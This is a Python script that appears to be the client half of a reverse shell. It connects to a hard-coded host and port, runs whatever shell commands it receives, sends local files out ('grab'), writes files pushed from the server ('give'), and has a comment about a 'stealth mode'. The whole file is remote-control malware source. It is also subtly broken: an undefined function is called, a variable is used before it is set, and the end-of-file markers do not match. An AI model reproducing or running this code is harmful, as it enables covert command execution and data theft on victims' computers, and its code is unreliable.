import socket
import os
import subprocess
import sys

s = socket.socket()
host = "192.168.0.58"
port = 9998


def transfer_to_server(s,path):
    #print("Recieved Transfer Request")
    if os.path.exists(path):
        f = open(path, 'rb')
        packet_size = 1024
        packet = f.read(packet_size)
        while packet.decode("utf-8") != '':
            s.send(packet) 
            packet = f.read(packet_size)
        s.send(str.encode('ENDOFFILE'))
        f.close()
    else: # the file doesn't exist
        s.send(str.encode('Unable to find file832'))

def transfer_to_client(s,cmd):
    f = open(cmd,"wb")
    print("opened file")
    while True:
        print("getting packets...")
        bits = s.recv(1024)
        if "end of file832" in str(bits,"utf-8"):
            # find out how to send success message to server
            f.close
            break
        f.write(bits)
        
    print("got all packets")
    f.close





s.connect((host,port))

while True: # create a read/write infinite loop
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    
    elif data.decode("utf-8") == 'disconnect':
        s.close
        break
    
    elif "grab" in data.decode("utf-8"):
        path = data.decode("utf-8")
        new_path = path.replace("grab ","")
        try: # always use exception handling in low level file transfer
            transfer_from_server(s,new_path)
        except Exception as e:
            s.send(str.encode(str(e)))
            pass
    
    elif "give" in data.decode("utf-8"):
        path = data.decode("utf-8")
        new_path = path.replace("give ","")
        try:
            print("Trying transfer")
            transfer_to_client(s,cmd)
        except Exception as e:
            s.send(str.encode(str(e)))
            pass
    
    elif len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWorkingDirectory = os.getcwd() + " > "
        s.send(str.encode(output_str + currentWorkingDirectory))
        # print(output_str) # delete this part to remove output on client computer (Stealth mode)
